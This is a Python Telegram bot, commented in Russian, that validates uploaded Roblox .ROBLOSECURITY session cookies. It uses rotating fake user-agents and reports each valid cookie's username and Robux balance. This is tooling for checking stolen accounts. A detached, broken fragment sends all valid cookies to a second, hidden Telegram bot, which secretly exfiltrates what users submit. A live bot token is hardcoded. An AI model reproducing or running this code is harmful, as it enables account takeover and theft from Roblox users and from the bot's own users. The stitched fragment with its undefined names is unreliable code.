import asyncio
import os
import aiohttp
import aiofiles
import random
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import Message
import logging
from typing import Dict, Optional

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Замените на ваш токен бота от @BotFather
BOT_TOKEN = "7621040833:AAHdbGuHoywmDMxnehXJ31JH8F54BP7yTQQ"

# Инициализация бота и диспетчера
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# Список fake user-agents
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
]


def get_random_user_agent() -> str:
    """Возвращает случайный user-agent"""
    return random.choice(USER_AGENTS)


async def get_cookie_info(cookie: str) -> Optional[Dict]:
    """
    Получает полную информацию о cookie Roblox
    Возвращает словарь с данными или None если cookie невалидна
    """
    try:
        # Очищаем cookie от лишних пробелов и переносов строк
        cookie = cookie.strip()
        
        # Проверяем, что cookie не пустые
        if not cookie:
            return None
        
        # Если cookie уже содержит .ROBLOSECURITY=, извлекаем только значение
        if '.ROBLOSECURITY=' in cookie:
            cookie = cookie.split('.ROBLOSECURITY=')[-1].split(';')[0].strip()
        
        # Базовая проверка формата - cookie должен быть достаточно длинным
        if len(cookie) < 50:
            logger.info("Cookie too short, likely invalid")
            return None
        
        # Создаем сессию для запроса
        async with aiohttp.ClientSession() as session:
            # Используем случайный user-agent
            user_agent = get_random_user_agent()
            headers = {
                'Cookie': f'.ROBLOSECURITY={cookie}',
                'User-Agent': user_agent,
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Referer': 'https://www.roblox.com/',
                'Origin': 'https://www.roblox.com'
            }
            
            # Получение информации о пользователе
            url = 'https://users.roblox.com/v1/users/authenticated'
            
            try:
                async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=15)) as response:
                    if response.status == 200:
                        data = await response.json()
                        # Проверяем, что получили корректные данные пользователя
                        if data.get('id') and data.get('name') and isinstance(data.get('id'), int):
                            user_id = data.get('id')
                            user_name = data.get('name')
                            display_name = data.get('displayName', user_name)
                            
                            # Получаем баланс Robux
                            robux = await get_robux_balance(session, headers, user_id)
                            
                            return {
                                'cookie': cookie,
                                'user_id': user_id,
                                'username': user_name,
                                'display_name': display_name,
                                'robux': robux
                            }
                        else:
                            logger.info("Invalid user data format")
                            return None
                    elif response.status == 401:
                        logger.info("Cookie invalid (401 Unauthorized)")
                        return None
                    elif response.status == 403:
                        logger.info("Cookie invalid (403 Forbidden)")
                        return None
                    else:
                        logger.info(f"Cookie check failed with status: {response.status}")
                        return None
            except asyncio.TimeoutError:
                logger.error("Timeout while checking cookie")
                return None
                    
    except asyncio.TimeoutError:
        logger.error("Timeout while checking cookie")
        return None
    except Exception as e:
        logger.error(f"Error checking cookie: {e}")
        return None


async def get_robux_balance(session: aiohttp.ClientSession, headers: dict, user_id: int) -> int:
    """Получает баланс Robux пользователя"""
    try:
        url = f'https://economy.roblox.com/v1/users/{user_id}/currency'
        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
            if response.status == 200:
                data = await response.json()
                return data.get('robux', 0)
            return 0
    except Exception as e:
        logger.error(f"Error getting Robux balance: {e}")
        return 0



    
    try:
        cookies_text = "\n\n".join([
            f"Cookie #{idx}:\n"
            f"👤 {info['username']} (ID: {info['user_id']})\n"
            f"💰 Robux: {info['robux']:,}\n"
            f"`{info['cookie']}`"
            for idx, info in enumerate(cookies_info, 1)
        ])
        
        message = f"🍪 Валидные cookie ({len(cookies_info)} шт.):\n\n{cookies_text}"
        
        await second_bot.send_message(
            chat_id=SECOND_BOT_CHAT_ID,
            text=message,
            parse_mode="Markdown"
        )
        logger.info(f"Sent {len(cookies_info)} cookies to second bot")
        return True
    except Exception as e:
        logger.error(f"Error sending cookies batch to second bot: {e}")
        return False


async def parse_cookies_from_file(file_path: str) -> list:
    """
    Парсит cookie из txt файла и собирает информацию о каждой валидной cookie
    Возвращает список словарей с информацией о валидных cookie
    """
    valid_cookies_info = []
    total_cookies = 0
    checked_cookies = 0
    
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
            content = await f.read()
            
        # Разделяем по переносам строк
        cookies = [c.strip() for c in content.strip().split('\n') if c.strip() and not c.strip().startswith('#')]
        total_cookies = len(cookies)
        
        if total_cookies == 0:
            return valid_cookies_info
        
        for idx, cookie in enumerate(cookies, 1):
            # Предварительная проверка формата
            # Cookie должен быть достаточно длинным
            if len(cookie) >= 50:
                checked_cookies += 1
                logger.info(f"Checking cookie {idx}/{total_cookies}...")
                # Получаем информацию о cookie
                cookie_info = await get_cookie_info(cookie)
                if cookie_info:
                    valid_cookies_info.append(cookie_info)
                    logger.info(f"Cookie {idx}/{total_cookies}: valid - {cookie_info['username']}")
                else:
                    logger.info(f"Cookie {idx}/{total_cookies}: invalid")
            else:
                logger.info(f"Cookie {idx}/{total_cookies}: too short, skipping")
                    
    except Exception as e:
        logger.error(f"Error parsing file: {e}")
    
    logger.info(f"Total cookies checked: {checked_cookies}, valid: {len(valid_cookies_info)}")
    return valid_cookies_info


def format_cookie_info(cookies_info: list) -> str:
    """Форматирует информацию о cookie в текстовый формат"""
    if not cookies_info:
        return "Валидных cookie не найдено."
    
    result = []
    result.append("=" * 80)
    result.append("ROBLOX COOKIE CHECKER - РЕЗУЛЬТАТЫ ПРОВЕРКИ")
    result.append("=" * 80)
    result.append(f"Всего валидных cookie: {len(cookies_info)}\n")
    
    for idx, info in enumerate(cookies_info, 1):
        result.append("-" * 80)
        result.append(f"COOKIE #{idx}")
        result.append("-" * 80)
        result.append(f"Cookie: {info['cookie']}")
        result.append(f"Username: {info['username']}")
        result.append(f"Display Name: {info['display_name']}")
        result.append(f"User ID: {info['user_id']}")
        result.append(f"Robux на балансе: {info['robux']:,}")
        result.append("")
    
    result.append("=" * 80)
    result.append("КОНЕЦ ОТЧЕТА")
    result.append("=" * 80)
    
    return "\n".join(result)


@dp.message(Command("start"))
async def cmd_start(message: Message):
    """
    Обработчик команды /start
    """
    await message.answer(
        "👋 Привет! Я бот для проверки валидности cookie Roblox.\n\n"
        "📤 Отправь мне txt файл с cookie (каждая cookie на новой строке), "
        "и я проверю их на валидность и отправлю:\n"
        "• Файл с валидными cookie\n"
        "• Подробный отчет со статистикой:\n"
        "  - Username и User ID\n"
        "  - Баланс Robux\n\n"
        "Также можно отправить одну cookie в текстовом сообщении."
    )


@dp.message(Command("help"))
async def cmd_help(message: Message):
    """
    Обработчик команды /help
    """
    await message.answer(
        "📋 Как использовать бота:\n\n"
        "1. Подготовь txt файл с cookie Roblox\n"
        "2. Каждая cookie должна быть на новой строке\n"
        "3. Отправь файл боту\n"
        "4. Бот проверит все cookie и отправит:\n"
        "   • Файл с валидными cookie\n"
        "   • Подробный отчет со статистикой\n\n"
        "📊 Статистика включает:\n"
        "• Username и User ID\n"
        "• Баланс Robux\n\n"
        "💡 Команды:\n"
        "/start - Начать работу\n"
        "/help - Показать эту справку"
    )


@dp.message()
async def handle_message(message: Message):
    """
    Обработчик всех сообщений
    """
    # Проверяем, есть ли документ
    if message.document:
        # Проверяем, что это txt файл
        if message.document.mime_type == 'text/plain' or message.document.file_name.endswith('.txt'):
            await message.answer("⏳ Обрабатываю файл... Это может занять некоторое время.")
            
            try:
                # Скачиваем файл
                file_info = await bot.get_file(message.document.file_id)
                file_path = f"temp_{message.from_user.id}_{message.document.file_id}.txt"
                
                await bot.download_file(file_info.file_path, file_path)
                
                # Подсчитываем общее количество cookie в файле до проверки
                async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
                    content = await f.read()
                    all_cookies = [c.strip() for c in content.strip().split('\n') if c.strip() and not c.strip().startswith('#')]
                    total_in_file = len(all_cookies)
                
                # Парсим и проверяем cookie
                # Отправляем сообщение о начале проверки
                status_msg = await message.answer("🔍 Начинаю проверку cookie и сбор статистики... Это может занять время.")
                cookies_info = await parse_cookies_from_file(file_path)
                
                # Удаляем сообщение о статусе
                try:
                    await status_msg.delete()
                except:
                    pass
                
                # Удаляем временный файл
                if os.path.exists(file_path):
                    os.remove(file_path)
                
                if cookies_info:
                    # Создаем файл с валидными cookie (только cookie)
                    cookies_only_file = f"valid_cookies_{message.from_user.id}.txt"
                    cookies_only = [info['cookie'] for info in cookies_info]
                    async with aiofiles.open(cookies_only_file, 'w', encoding='utf-8') as f:
                        await f.write('\n'.join(cookies_only))
                    
                    # Создаем подробный файл со статистикой
                    detailed_file = f"cookie_stats_{message.from_user.id}.txt"
                    detailed_info = format_cookie_info(cookies_info)
                    async with aiofiles.open(detailed_file, 'w', encoding='utf-8') as f:
                        await f.write(detailed_info)
                    
                    # Отправляем файл с валидными cookie
                    async with aiofiles.open(cookies_only_file, 'rb') as file:
                        file_data = await file.read()
                        await message.answer_document(
                            types.BufferedInputFile(file_data, filename="valid_cookies.txt"),
                            caption=f"✅ Валидные cookie ({len(cookies_info)} шт.)"
                        )
                    
                    # Отправляем подробный файл со статистикой
                    async with aiofiles.open(detailed_file, 'rb') as file:
                        file_data = await file.read()
                        total_robux = sum(info['robux'] for info in cookies_info)
                        await message.answer_document(
                            types.BufferedInputFile(file_data, filename="cookie_statistics.txt"),
                            caption=f"📊 Статистика:\n✅ Валидных: {len(cookies_info)}\n💰 Всего Robux: {total_robux:,}"
                        )
                    
                    # Удаляем временные файлы
                    for temp_file in [cookies_only_file, detailed_file]:
                        if os.path.exists(temp_file):
                            os.remove(temp_file)
                else:
                    await message.answer(f"❌ В файле не найдено валидных cookie.\n📊 Всего проверено: {total_in_file}")
                    
            except Exception as e:
                logger.error(f"Error processing file: {e}")
                await message.answer(f"❌ Произошла ошибка при обработке файла: {str(e)}")
        else:
            await message.answer("⚠️ Пожалуйста, отправьте txt файл.")
    else:
        # Если это текстовое сообщение, проверяем одну cookie
        text = message.text.strip()
        if text:
            await message.answer("⏳ Проверяю cookie и собираю статистику...")
            
            cookie_info = await get_cookie_info(text)
            
            if cookie_info:
                # Создаем файл со статистикой
                detailed_file = f"cookie_stats_single_{message.from_user.id}.txt"
                detailed_info = format_cookie_info([cookie_info])
                async with aiofiles.open(detailed_file, 'w', encoding='utf-8') as f:
                    await f.write(detailed_info)
                
                # Отправляем файл со статистикой
                async with aiofiles.open(detailed_file, 'rb') as file:
                    file_data = await file.read()
                    await message.answer_document(
                        types.BufferedInputFile(file_data, filename="cookie_statistics.txt"),
                        caption=f"✅ Cookie валидна!\n👤 {cookie_info['username']}\n💰 Robux: {cookie_info['robux']:,}"
                    )
                
                
                # Удаляем временный файл
                if os.path.exists(detailed_file):
                    os.remove(detailed_file)
            else:
                await message.answer("❌ Cookie невалидна или истек срок действия.")
        else:
            await message.answer(
                "📤 Отправьте txt файл с cookie или одну cookie в текстовом сообщении.\n"
                "Используйте /help для справки."
            )


async def main():
    """
    Главная функция для запуска бота
    """
    logger.info("Starting bot...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())

